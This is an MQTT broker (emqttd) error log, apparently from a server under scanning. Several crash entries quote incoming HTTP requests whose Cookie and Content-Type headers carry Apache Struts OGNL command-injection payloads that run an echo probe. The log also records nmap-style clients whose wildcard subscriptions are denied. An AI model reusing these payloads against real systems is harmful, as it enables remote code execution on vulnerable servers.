+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.85336>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/x-www-form-urlencoded"},{"content-length",{'Content-Length',"0"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20a7a5366a90b76d2f02e5b741e7a516ac%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:50:21.556 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.24757.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.85337>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:50:21.558 [error] Error in process <0.24757.3> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.85337>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/x-www-form-urlencoded"},{"content-length",{'Content-Length',"0"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20a7a5366a90b76d2f02e5b741e7a516ac%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:50:23.399 [error] Unexpected WS Request: GET /
+18:50:23.489 [error] Unexpected WS Request: GET /nice ports,/Trinity.txt.bak
+18:50:24.131 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.24764.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.85344>,#Fun<esockd_transport.2.122912610>,[]]},'OPTIONS',...]}, 'OPTIONS') line 67 in context connection_crashed
+18:50:24.132 [error] Error in process <0.24764.3> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.85344>,#Fun<esockd_transport.2.122912610>,[]]},'OPTIONS',"/",{1,0},{0,nil}]},'OPTIONS'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:50:28.628 [error] Unexpected WS Request: OPTIONS /
+18:51:00.406 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.24828.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.85399>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:51:00.407 [error] Error in process <0.24828.3> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.85399>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/x-www-form-urlencoded"},{"content-length",{'Content-Length',"0"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20a7a5366a90b76d2f02e5b741e7a516ac%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:51:01.115 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.24831.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.85402>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:51:01.116 [error] Error in process <0.24831.3> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.85402>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/x-www-form-urlencoded"},{"content-length",{'Content-Length',"0"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20a7a5366a90b76d2f02e5b741e7a516ac%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:51:03.794 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.24834.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.85404>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:51:03.795 [error] Error in process <0.24834.3> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.85404>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/x-www-form-urlencoded"},{"content-length",{'Content-Length',"0"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20a7a5366a90b76d2f02e5b741e7a516ac%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:51:09.643 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.24852.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.85419>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:51:09.644 [error] Error in process <0.24852.3> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.85419>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/x-www-form-urlencoded"},{"content-length",{'Content-Length',"0"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20a7a5366a90b76d2f02e5b741e7a516ac%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:51:09.728 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.24853.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.85420>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:51:09.729 [error] Error in process <0.24853.3> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.85420>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/x-www-form-urlencoded"},{"content-length",{'Content-Length',"0"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20a7a5366a90b76d2f02e5b741e7a516ac%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:51:09.811 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.24854.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.85421>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:51:09.813 [error] Error in process <0.24854.3> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.85421>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/x-www-form-urlencoded"},{"content-length",{'Content-Length',"0"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20a7a5366a90b76d2f02e5b741e7a516ac%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:51:09.901 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.24855.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.85422>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:51:09.902 [error] Error in process <0.24855.3> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.85422>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=new java.lang.String[]{'echo', '6bbb379a508084d2b39734658bc60428'}).(#p=new java.lang.ProcessBuilder(#cmd)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"},{"content-length",{'Content-Length',"0"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20a7a5366a90b76d2f02e5b741e7a516ac%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:51:10.790 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.24856.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.85423>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:51:10.792 [error] Error in process <0.24856.3> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.85423>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=new java.lang.String[]{'echo', '6bbb379a508084d2b39734658bc60428'}).(#p=new java.lang.ProcessBuilder(#cmd)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"},{"content-length",{'Content-Length',"0"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20a7a5366a90b76d2f02e5b741e7a516ac%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:51:12.085 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.24862.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.85428>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:51:12.086 [error] Error in process <0.24862.3> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.85428>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=new java.lang.String[]{'echo', '6bbb379a508084d2b39734658bc60428'}).(#p=new java.lang.ProcessBuilder(#cmd)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"},{"content-length",{'Content-Length',"0"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20a7a5366a90b76d2f02e5b741e7a516ac%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+
+===== ALIVE Sun Feb 17 19:06:12 CST 2019
+
+===== ALIVE Sun Feb 17 19:21:12 CST 2019
+
+===== ALIVE Sun Feb 17 19:36:12 CST 2019
+
+===== ALIVE Sun Feb 17 19:51:12 CST 2019
+
+===== ALIVE Sun Feb 17 20:06:12 CST 2019
+
+===== ALIVE Sun Feb 17 20:21:12 CST 2019
+
+===== ALIVE Sun Feb 17 20:36:12 CST 2019
+
+===== ALIVE Sun Feb 17 20:51:12 CST 2019
+
+===== ALIVE Sun Feb 17 21:06:12 CST 2019
+
+===== ALIVE Sun Feb 17 21:21:12 CST 2019
+
+===== ALIVE Sun Feb 17 21:36:13 CST 2019
+
+===== ALIVE Sun Feb 17 21:51:13 CST 2019
+21:51:44.492 [error] Client(emqttd_121483200330377@178.73.215.171:34307): Cannot SUBSCRIBE [{<<"$SYS/broker/version">>,[{qos,0}]}] for ACL Deny
+21:51:44.492 [error] Client(emqttd_121483200330377@178.73.215.171:34307): Cannot SUBSCRIBE [{<<"#">>,[{qos,0}]}] for ACL Deny
+
+===== ALIVE Sun Feb 17 22:06:44 CST 2019
+
+===== ALIVE Sun Feb 17 22:21:44 CST 2019
+
+===== ALIVE Sun Feb 17 22:36:44 CST 2019
+
+===== ALIVE Sun Feb 17 22:51:44 CST 2019
+
+===== ALIVE Sun Feb 17 23:06:44 CST 2019
+
+===== ALIVE Sun Feb 17 23:21:45 CST 2019
+
+===== ALIVE Sun Feb 17 23:36:45 CST 2019
+
+===== ALIVE Sun Feb 17 23:51:45 CST 2019
+
+===== ALIVE Mon Feb 18 00:06:45 CST 2019
+
+===== ALIVE Mon Feb 18 00:21:45 CST 2019
+
+===== ALIVE Mon Feb 18 00:36:45 CST 2019
+
+===== ALIVE Mon Feb 18 00:51:45 CST 2019
+
+===== Mon Feb 18 00:58:33 CST 2019
+00:58:33.180 [error] Client(nmapNLVNNYEBPSZBOBBX@114.67.230.108:59856): Cannot SUBSCRIBE [{<<"$SYS/#">>,[{qos,0}]},{<<"#">>,[{qos,0}]}] for ACL Deny
+
+===== ALIVE Mon Feb 18 01:13:33 CST 2019
+
+===== ALIVE Mon Feb 18 01:28:33 CST 2019
+
+===== ALIVE Mon Feb 18 01:43:33 CST 2019
+
+===== ALIVE Mon Feb 18 01:58:33 CST 2019
+
+===== ALIVE Mon Feb 18 02:13:33 CST 2019
+
+===== ALIVE Mon Feb 18 02:28:33 CST 2019
+
+===== ALIVE Mon Feb 18 02:43:33 CST 2019
+
+===== ALIVE Mon Feb 18 02:58:33 CST 2019
+
+===== ALIVE Mon Feb 18 03:13:34 CST 2019
+
+===== ALIVE Mon Feb 18 03:28:34 CST 2019
+
+===== ALIVE Mon Feb 18 03:43:34 CST 2019
+
+===== ALIVE Mon Feb 18 03:58:34 CST 2019
+
+===== ALIVE Mon Feb 18 04:13:34 CST 2019
+
+===== ALIVE Mon Feb 18 04:28:34 CST 2019
+
+===== ALIVE Mon Feb 18 04:43:34 CST 2019
+
+===== ALIVE Mon Feb 18 04:58:34 CST 2019
+
+===== ALIVE Mon Feb 18 05:13:34 CST 2019
+
+===== ALIVE Mon Feb 18 05:28:34 CST 2019
+
+===== ALIVE Mon Feb 18 05:43:34 CST 2019
+
+===== ALIVE Mon Feb 18 05:58:35 CST 2019
+
+===== ALIVE Mon Feb 18 06:13:35 CST 2019
+
+===== ALIVE Mon Feb 18 06:28:35 CST 2019
+
+===== ALIVE Mon Feb 18 06:43:35 CST 2019
+
+===== ALIVE Mon Feb 18 06:58:35 CST 2019
+
+===== ALIVE Mon Feb 18 07:13:35 CST 2019
+
+===== ALIVE Mon Feb 18 07:28:35 CST 2019
+
+===== ALIVE Mon Feb 18 07:43:35 CST 2019
+
+===== ALIVE Mon Feb 18 07:58:35 CST 2019
+
+===== ALIVE Mon Feb 18 08:13:35 CST 2019
+
+===== ALIVE Mon Feb 18 08:28:35 CST 2019
+
+===== ALIVE Mon Feb 18 08:43:36 CST 2019
+
+===== ALIVE Mon Feb 18 08:58:36 CST 2019
+
+===== ALIVE Mon Feb 18 09:13:36 CST 2019
+
+===== ALIVE Mon Feb 18 09:28:36 CST 2019
+09:29:20.418 [error] gen_server <0.17064.4> terminated with reason: no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/Consumption">>,...}]},...}, {proto_state,{{117,48,224,90},49612},#Fun<emqttd_client.0.18944683>,true,<<"6067">>,<0.17064.4>,...}) line 191
